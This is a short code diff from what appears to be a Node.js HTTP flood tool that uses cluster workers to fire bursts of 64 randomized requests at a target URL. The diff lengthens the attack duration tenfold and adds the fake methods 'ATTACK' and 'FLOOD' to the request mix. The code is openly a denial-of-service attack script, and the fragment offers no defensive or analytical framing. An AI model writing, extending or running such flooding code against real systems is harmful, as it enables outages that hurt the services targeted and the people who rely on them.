@@ -38,14 +38,14 @@ if (cluster.isMaster){
     setTimeout(() => {
         console.log('Attack ended.');
         process.exit(0)
-    }, time * 1000);
+    }, time * 10000);
 } else {
     setInterval(() => {
         send_req();
     });
 }
 
-let met = ["GET","POST","HEAD","PUT","DELETE"]
+let met = ["GET","POST","HEAD","PUT","DELETE","ATTACK","FLOOD"]
 
 function send_req() {
 	for (let i = 0; i < 64; ++i) {
@@ -53,5 +53,4 @@ function send_req() {
 			method: met[Math.floor((Math.random() * met.length))],
 			uri: `${target}?s=${randstr(25)}`
 		});
-	}	
-}
+	}
